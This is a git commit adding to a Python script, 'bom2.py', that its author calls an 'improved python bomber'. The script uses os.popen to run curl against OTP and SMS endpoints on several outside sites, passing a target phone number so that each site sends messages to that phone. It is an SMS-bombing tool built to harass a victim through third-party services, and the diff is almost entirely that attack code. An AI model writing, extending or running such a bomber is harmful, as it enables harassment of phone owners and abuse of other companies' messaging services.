50b8219f8de883122139ead7b728fecc18332cba
apa-richit <57231457+apa-richit@users.noreply.github.com>
2019-10-31 23:09:07 +0530

    improved python bomber bom2.py
    improved python bomber

--- bom2.py
+++ bom2.py
@@ -1,3 +1,9 @@
 import os
-result = os.popen("curl http://thespartanpoker.com/smsc?PHONE=9999888800").read()
+result = os.popen("curl http://thespartanpoker.com/smsc?PHONE=$phonen").read()
+print result
+result = os.popen("curl http://chipbazar.com/SendOTP.asp?For=Phone&PhoneNo=$phonen").read()
+print result
+result = os.popen("curl http://callingstation.in/SendOTP.asp?For=Phone&PhoneNo=$phonen").read()
+print result
+result = os.popen("curl http://52redrummy.com/SendOTP.asp?For=Phone&PhoneNo=$phonen").read()
 print result
